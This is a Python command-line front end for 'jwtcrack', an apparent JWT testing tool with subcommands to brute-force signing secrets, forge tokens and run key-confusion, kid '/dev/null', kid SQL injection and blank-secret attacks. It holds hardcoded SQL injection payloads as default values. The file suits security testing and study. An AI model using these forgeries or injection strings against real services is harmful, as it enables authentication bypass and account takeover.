import argparse
import sys


def main():
    if hasattr(sys.stdout, "reconfigure"):
        try:
            sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        except Exception:
            pass
    if hasattr(sys.stderr, "reconfigure"):
        try:
            sys.stderr.reconfigure(encoding="utf-8", errors="replace")
        except Exception:
            pass

    parser = argparse.ArgumentParser(
        prog="jwtcrack",
        description="JWT Token Analyzer & Secret Brute-Forcer",
    )
    subparsers = parser.add_subparsers(dest="command")

    decode_parser = subparsers.add_parser("decode", help="Decode a JWT token")
    decode_parser.add_argument("token")
    decode_parser.add_argument("--aspnet", action="store_true", help="Normalize ASP.NET XML schema claims")

    subparsers.add_parser("analyze", help="Analyze token for vulnerabilities").add_argument("token")

    subparsers.add_parser("aspnet", help="Inspect and normalize ASP.NET Core XML schema claims").add_argument("token")

    crack_parser = subparsers.add_parser("crack", help="Brute-force the signing secret")
    crack_parser.add_argument("token")
    crack_parser.add_argument("--wordlist", "-w", required=True)
    crack_parser.add_argument("--threads", "-t", type=int, default=8)

    forge_parser = subparsers.add_parser("forge", help="Forge a modified token")
    forge_parser.add_argument("token")
    forge_parser.add_argument("--secret", "-s", required=True)
    forge_parser.add_argument("--claims", "-c", required=True)
    forge_parser.add_argument("--extend-exp", default=None)
    forge_parser.add_argument("--aspnet", action="store_true", help="Convert claims to ASP.NET XML schemas")

    gen_parser = subparsers.add_parser("generate", help="Generate a new JWT token")
    gen_parser.add_argument("--secret", "-s", required=True)
    gen_parser.add_argument("--claims", "-c", required=True)
    gen_parser.add_argument("--aspnet", action="store_true", help="Convert claims to ASP.NET XML schemas")

    exploit_parser = subparsers.add_parser("exploit", help="Forge tokens using CVE exploit techniques")
    exploit_parser.add_argument("token")
    exploit_parser.add_argument("--attack", "-a", choices=["key-confusion", "devnull", "sqli", "blank"], default="key-confusion", help="Exploit technique")
    exploit_parser.add_argument("--public-key", "-k", help="Public key PEM file or string for key-confusion")
    exploit_parser.add_argument("--claims", "-c", default=None, help="JSON claims to inject")
    exploit_parser.add_argument("--kid", default=None, help="Custom kid header value")
    exploit_parser.add_argument("--secret", "-s", default=None, help="Secret for SQLi attack")

    gui_parser = subparsers.add_parser("gui", help="Launch interactive web dashboard")
    gui_parser.add_argument("--port", "-p", type=int, default=8765, help="Port to serve dashboard on")
    parser.add_argument("--gui", action="store_true", help="Launch interactive web dashboard")

    args = parser.parse_args()

    if args.gui or args.command == "gui":
        from jwtcrack.gui import launch_gui
        port = getattr(args, "port", 8765)
        launch_gui(port=port)
        return

    if args.command is None:
        _interactive_mode()
        return

    if args.command == "decode":
        from jwtcrack.decoder import decode_token
        from jwtcrack.display import display_decoded
        result = decode_token(args.token)
        if args.aspnet:
            from jwtcrack.aspnet import normalize_aspnet_claims
            result["payload"] = normalize_aspnet_claims(result["payload"])
        display_decoded(result)

    elif args.command == "analyze":
        from jwtcrack.decoder import decode_token
        from jwtcrack.analyzer import analyze_token
        from jwtcrack.display import display_analysis
        decoded = decode_token(args.token)
        findings = analyze_token(decoded)
        display_analysis(decoded, findings)

    elif args.command == "aspnet":
        from jwtcrack.decoder import decode_token
        from jwtcrack.aspnet import check_aspnet_issues
        from jwtcrack.display import display_analysis
        decoded = decode_token(args.token)
        findings = check_aspnet_issues(decoded["payload"])
        display_analysis(decoded, findings)

    elif args.command == "crack":
        from jwtcrack.cracker import crack_token
        from jwtcrack.display import display_crack_result
        result = crack_token(args.token, args.wordlist, args.threads)
        display_crack_result(result)

    elif args.command == "forge":
        import json
        from jwtcrack.forger import forge_token
        from jwtcrack.display import display_forged
        claims = json.loads(args.claims)
        forged = forge_token(args.token, args.secret, claims, args.extend_exp, as_aspnet=args.aspnet)
        display_forged(forged)

    elif args.command == "generate":
        import json
        from jwtcrack.forger import generate_token
        from jwtcrack.display import display_forged
        claims = json.loads(args.claims)
        token = generate_token(args.secret, claims, as_aspnet=args.aspnet)
        display_forged(token)

    elif args.command == "exploit":
        import json
        from jwtcrack.display import display_forged
        from jwtcrack.exploits import (
            forge_key_confusion,
            forge_kid_devnull,
            forge_kid_sqli,
            forge_blank_secret,
        )
        claims = json.loads(args.claims) if args.claims else {}
        if args.attack == "key-confusion":
            if not args.public_key:
                print("Error: --public-key is required for key-confusion attack.")
                sys.exit(1)
            res = forge_key_confusion(args.token, args.public_key, claims)
        elif args.attack == "devnull":
            kid_val = args.kid if args.kid else "/dev/null"
            res = forge_kid_devnull(args.token, claims, kid=kid_val)
        elif args.attack == "sqli":
            inj = args.kid if args.kid else "key' UNION SELECT 'secret123' -- -"
            sec = args.secret if args.secret else "secret123"
            res = forge_kid_sqli(args.token, injection=inj, secret=sec, new_claims=claims)
        elif args.attack == "blank":
            res = forge_blank_secret(args.token, claims)
        display_forged(res)


def _interactive_mode():
    try:
        from rich.prompt import Prompt
        from rich.console import Console

        console = Console()
        console.print("\n[bold cyan]jwtcrack[/bold cyan] — JWT Token Analyzer & Secret Brute-Forcer\n")

        token = Prompt.ask("[bold yellow]Paste your JWT token[/bold yellow]")
        if not token.strip():
            console.print("[red]No token provided.[/red]")
            sys.exit(1)

        action = Prompt.ask(
            "[bold yellow]What do you want to do?[/bold yellow]",
            choices=["decode", "analyze", "aspnet", "exploit", "crack", "forge", "gui"],
            default="gui",
        )

        if action == "gui":
            from jwtcrack.gui import launch_gui
            launch_gui()
            return

        from jwtcrack.decoder import decode_token
        from jwtcrack.display import display_decoded, display_analysis, display_crack_result, display_forged

        if action == "decode":
            result = decode_token(token)
            display_decoded(result)

        elif action == "analyze":
            from jwtcrack.analyzer import analyze_token
            decoded = decode_token(token)
            findings = analyze_token(decoded)
            display_analysis(decoded, findings)

        elif action == "aspnet":
            from jwtcrack.aspnet import check_aspnet_issues
            decoded = decode_token(token)
            findings = check_aspnet_issues(decoded["payload"])
            display_analysis(decoded, findings)

        elif action == "exploit":
            attack = Prompt.ask(
                "[bold yellow]Select exploit technique[/bold yellow]",
                choices=["key-confusion", "devnull", "sqli", "blank"],
                default="devnull",
            )
            claims_raw = Prompt.ask("[bold yellow]Claims JSON (optional)[/bold yellow]", default="{}")
            import json
            from jwtcrack.exploits import forge_key_confusion, forge_kid_devnull, forge_kid_sqli, forge_blank_secret
            claims = json.loads(claims_raw) if claims_raw else {}
            if attack == "key-confusion":
                pub = Prompt.ask("[bold yellow]Path to public key PEM or raw PEM string[/bold yellow]")
                forged = forge_key_confusion(token, pub, claims)
            elif attack == "devnull":
                forged = forge_kid_devnull(token, claims)
            elif attack == "sqli":
                inj = Prompt.ask("[bold yellow]KID SQL injection payload[/bold yellow]", default="key' UNION SELECT 'secret' -- -")
                sec = Prompt.ask("[bold yellow]Injected secret[/bold yellow]", default="secret")
                forged = forge_kid_sqli(token, injection=inj, secret=sec, new_claims=claims)
            elif attack == "blank":
                forged = forge_blank_secret(token, claims)
            display_forged(forged)

        elif action == "crack":
            wordlist = Prompt.ask("[bold yellow]Path to wordlist[/bold yellow]", default="wordlists/common.txt")
            threads = int(Prompt.ask("[bold yellow]Threads[/bold yellow]", default="8"))
            from jwtcrack.cracker import crack_token
            result = crack_token(token, wordlist, threads)
            display_crack_result(result)

        elif action == "forge":
            secret = Prompt.ask("[bold yellow]Signing secret[/bold yellow]")
            claims_raw = Prompt.ask("[bold yellow]Claims JSON[/bold yellow]")
            import json
            from jwtcrack.forger import forge_token
            claims = json.loads(claims_raw)
            forged = forge_token(token, secret, claims)
            display_forged(forged)

    except KeyboardInterrupt:
        print("\nBye.")
        sys.exit(0)
